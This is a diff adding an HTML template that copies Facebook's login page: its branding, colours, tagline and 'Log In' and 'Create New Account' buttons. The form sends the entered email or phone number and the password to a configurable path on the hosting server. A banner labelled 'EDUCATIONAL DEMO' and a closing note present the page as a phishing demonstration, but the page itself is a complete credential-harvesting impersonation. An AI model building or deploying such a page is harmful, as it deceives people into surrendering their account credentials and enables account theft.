@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook - Log In or Sign Up</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .fb-blue { color: #1877f2; }
+        .fb-bg-blue { background-color: #1877f2; }
+        .fb-green { background-color: #42b72a; }
+    </style>
+</head>
+<body class="bg-gray-100">
+    <div class="bg-red-100 border border-red-400 text-red-700 p-2 text-center">
+        <strong>EDUCATIONAL DEMO:</strong> {{ warning }}
+    </div>
+
+    <div class="max-w-6xl mx-auto px-4 py-8">
+        <div class="grid md:grid-cols-2 gap-8 items-center">
+            <div class="text-center md:text-left">
+                <h1 class="fb-blue text-4xl md:text-5xl font-bold mb-4">facebook</h1>
+                <p class="text-xl">Facebook helps you connect and share with the people in your life.</p>
+            </div>
+
+            <div class="bg-white rounded-lg shadow p-6 max-w-md mx-auto">
+                <form action="/{{ custom_path }}/submit" method="POST">
+                    <input type="text" name="username" placeholder="Email or phone number" 
+                           class="w-full p-3 border rounded mb-3 focus:outline-none focus:border-blue-500" required>
+                    
+                    <input type="password" name="password" placeholder="Password" 
+                           class="w-full p-3 border rounded mb-3 focus:outline-none focus:border-blue-500" required>
+                    
+                    <button type="submit" class="fb-bg-blue text-white w-full p-3 rounded font-semibold mb-3">
+                        Log In
+                    </button>
+                    
+                    <a href="#" class="text-sm fb-blue hover:underline block text-center mb-4">
+                        Forgotten password?
+                    </a>
+                    
+                    <hr class="mb-4">
+                    
+                    <button type="button" class="fb-green text-white px-4 py-2 rounded font-semibold mx-auto block">
+                        Create New Account
+                    </button>
+                </form>
+
+                <div class="mt-4 p-3 bg-blue-50 rounded text-sm">
+                    <strong>Educational Note:</strong> This demonstrates phishing techniques. Always check URLs before logging in.
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
